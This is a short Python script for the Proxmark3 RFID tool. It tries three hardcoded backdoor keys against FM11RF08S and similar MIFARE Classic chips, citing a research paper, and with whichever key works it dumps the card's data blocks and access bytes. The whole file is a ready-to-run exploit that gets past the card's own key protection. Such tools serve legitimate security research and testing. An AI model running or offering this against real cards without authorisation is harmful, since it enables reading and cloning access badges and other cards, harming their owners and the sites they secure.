#!/usr/bin/env python3

# Uses the backdoor keys for the FM11RF08S (and similar) chipsets to quickly dump all the data they can read
# Should work on vulnerable 1k and 4k chips
# Based on the work in this paper: https://eprint.iacr.org/2024/1275

import pm3
import sys

BACKDOOR_KEYS = [("A396EFA4E24F", "1k"), ("A31667A8CEC1", "1k"), ("518B3354E760", "4k")]
WORKING_KEY = None

required_version = (3, 8)
if sys.version_info < required_version:
    print(f"Python version: {sys.version}")
    print(f"The script needs at least Python v{required_version[0]}.{required_version[1]}. Abort.")
    exit()
p = pm3.pm3()

# Test all the keys first to see which one works (if any)
for bk, sz in BACKDOOR_KEYS:
    p.console(f"hf mf ecfill --{sz} -c 4 -k {bk}")
    output = p.grabbed_output.split('\n')

    if "[#] Card not found" in output:
        print("Error reading the tag:")
        print("\n".join(output))
        break
    elif "[-]  Fill ( fail )" in output:
        continue
    elif "[+] Fill ( ok )" not in output:
        print("Unexpected output, exiting:")
        print("\n".join(output))
        break
    else:
        WORKING_KEY = bk
        break

if WORKING_KEY is None:
    print("None of the backdoor keys seem to work with this tag.")
else:
    print(f"Backdoor key {WORKING_KEY} seems to work, dumping data...")
    print("IMPORTANT: Only data blocks and access bytes can be dumped; keys will be shown as all 0's")
    p.console(f"hf mf eview --{sz}", True)
